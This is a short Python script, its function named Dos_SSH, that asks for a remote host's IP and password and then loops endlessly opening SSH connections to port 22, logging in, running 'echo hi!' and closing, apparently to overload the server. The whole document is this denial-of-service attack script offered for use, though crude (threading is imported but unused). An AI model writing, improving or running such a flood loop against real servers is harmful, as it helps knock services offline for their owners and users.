'''
Only PORT: 22
'''
import threading
import socket
import sys
import os
from ssh2.session import Session

host = input('enter RHOST IP > ')
password = input('enter RHOST password > ')
usr = os.getlogin()
count = 0

def Dos_SSH():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, 22))

        print('connected')

        session = Session()

        print('session created')
        session.handshake(s)
        session.userauth_password(usr, password)

        channel = session.open_session()
        channel.execute('echo hi!')
        size, data = channel.read()
        print(data.decode())

        global count
        count += 1
        print(count)


        channel.close()
        s.close()